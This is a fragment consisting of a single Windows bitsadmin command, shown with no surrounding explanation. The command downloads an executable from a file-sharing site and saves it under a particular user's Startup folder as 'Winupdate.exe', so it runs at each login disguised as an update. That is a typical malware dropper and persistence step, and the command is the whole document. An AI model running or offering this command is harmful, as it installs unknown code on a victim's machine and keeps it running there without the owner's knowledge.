...
bitsadmin /transfer Packages /download /priority foreground https://filebin.net/qkp6zkha0xbrzye9/APPk.exe "C:\Users\BEHESHTI-TEACHER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
